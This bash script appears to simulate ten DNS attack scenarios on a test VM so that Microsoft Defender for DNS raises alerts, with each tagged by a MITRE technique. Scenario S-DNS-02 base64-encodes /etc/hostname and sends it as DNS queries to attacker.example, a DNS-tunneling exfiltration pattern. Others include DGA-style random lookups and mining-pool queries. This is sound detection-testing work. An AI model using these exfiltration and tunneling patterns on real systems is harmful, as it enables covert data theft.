#!/usr/bin/env bash
# Defender for DNS — S-DNS-01..10
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/lib/common.sh"
confirm_safe

# These DNS lookups must be performed on a VM that has the MDE / mdatp agent so the signal is captured.
on_vm() { run_on_vm "$LIN_VM" "$RG_SERVERS" "$1"; }

s01() { scenario_header S-DNS-01 "DGA-like burst" T1568
  on_vm 'for i in $(seq 1 30); do dig $(openssl rand -hex 12).com +short; done | wc -l'
}

s02() { scenario_header S-DNS-02 "DNS tunneling (long TXT)" T1048
  on_vm 'PAYLOAD=$(base64 < /etc/hostname | tr -d "\n" | cut -c1-50); for i in 1 2 3 4 5; do dig "${PAYLOAD}.attacker.example" TXT +short; done'
}

s03() { scenario_header S-DNS-03 "Known-bad domain" T1071
  on_vm 'nslookup tor-relay.example +timeout=2 || true'
}

s04() { scenario_header S-DNS-04 "Mining pool DNS" T1496
  on_vm 'nslookup pool.minexmr.com | head -8'
}

s05() { scenario_header S-DNS-05 "Phishing-like domain" T1566
  on_vm 'nslookup login-microsoft-secure-azure.com || true'
}

s06() { scenario_header S-DNS-06 "Anonymity domain" T1090.003
  on_vm 'nslookup torproject.org'
}

s07() { scenario_header S-DNS-07 "Typosquat" T1566
  on_vm 'for d in mircosoft.com mircrosoft.com gooogle.com amaz0n.com; do nslookup $d +timeout=2 || true; done'
}

s08() { scenario_header S-DNS-08 "NXDOMAIN flood" T1046
  on_vm 'for i in $(seq 1 80); do dig $(uuidgen).contoso-fake.com +short; done | wc -l'
}

s09() { scenario_header S-DNS-09 "IDN homograph" T1566
  on_vm 'nslookup xn--pple-43d.com || true'
}

s10() { scenario_header S-DNS-10 "Newly-registered domain (walk-through)" T1071
  warn "Resolve a domain registered <24h ago (use any fresh registration)."
  on_vm 'nslookup brand-new-domain-please-replace.com || true'
}

dispatch "${1:?scenario number required (01..10)}"
